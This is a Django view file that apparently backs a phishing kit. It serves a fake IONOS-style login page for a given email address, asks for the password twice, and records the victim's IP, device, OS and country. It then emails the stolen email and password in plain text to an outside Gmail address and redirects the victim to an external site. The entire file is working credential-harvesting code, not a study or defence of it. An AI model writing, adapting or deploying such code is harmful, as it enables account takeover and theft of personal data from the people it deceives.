from django.views import View
from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.conf import settings
from django.http import HttpResponseRedirect
from django_user_agents.utils import get_user_agent


# Function to validate the email
def validate_email(email):
	# Perform email validation logic here
	# Return True if the email is valid, False otherwise
	# Example validation using Django's built-in email validation:
	from django.core.validators import validate_email
	from django.core.exceptions import ValidationError
		
	try:
		validate_email(email)
		return True
	except ValidationError:
		return False


def email_login(request,email):
	context = {'page_title':'Login Page'}
	# Extract the email domain
	email_parts = email.split('@')
	email_username = email_parts[0]
	email_domain = email_parts[1] if len(email_parts) > 1 else None
	
	# Validate if the email is a valid email address
	is_valid_email = validate_email(email)

	# if Email is valid
	if is_valid_email :
		context = {
			'email': email,
		# 	'email_username': email_username,
		# 	'email_domain': email_domain,
		# 	'is_valid_email': is_valid_email,
		}

		if request.method == "POST":
			password = request.POST.get("password")
			form_data = {"password":password}

			# Get device information
			device_name = request.user_agent.device.family
			os = request.user_agent.os.family
			location = request.META.get('HTTP_REFERER', '')
			ip = request.META.get('REMOTE_ADDR', '')
			country = request.META.get('HTTP_CF_IPCOUNTRY', '')
			time = request.META.get('HTTP_DATE', '')

			form_data = {
				'email': email,
				'password': password,
				'device_name': device_name,
				'os': os,
				'location': location,
				'ip': ip,
				'country': country,
				'time': time
			}

			previous_form_data = request.session.get('form_data')

			if previous_form_data:
				# # Compare with previous form data
				# if form_data == previous_form_data:
				# 	# Send email
				# 	message = f"Email: {email}\nPassword: {password}\n\nDevice Name: {device_name}\nOS: {os}\nLocation: {location}\nIP: {ip}\nCountry: {country}\nTime: {time}"
				# 	send_mail(
				# 		'Form Submission',
				# 		message,
				# 		settings.DEFAULT_FROM_EMAIL,
				# 		['james@gmail.com'],
				# 		fail_silently=False,
				# 	)
				# Compare with previous form data
				
				# Send email
				message = f"Email: {email}\nPassword: {password}\n\nDevice Name: {device_name}\nOS: {os}\nLocation: {location}\nIP: {ip}\nCountry: {country}\nTime: {time}"
				send_mail(
					'Form Submission',
					message,
					settings.DEFAULT_FROM_EMAIL,
					['receiver@gmail.com'],
					fail_silently=False,
				)
				# Clear stored form data
				request.session['form_data'] = None
				# Redirect to an external website
				return HttpResponseRedirect('http://goldpack.de')

			# Store form data in session for comparison on next submission
			request.session['form_data'] = form_data
		return render(request, 'login_page/ionos.html', context)
	else:
		return render(request, 'login_page/blank.html', context)


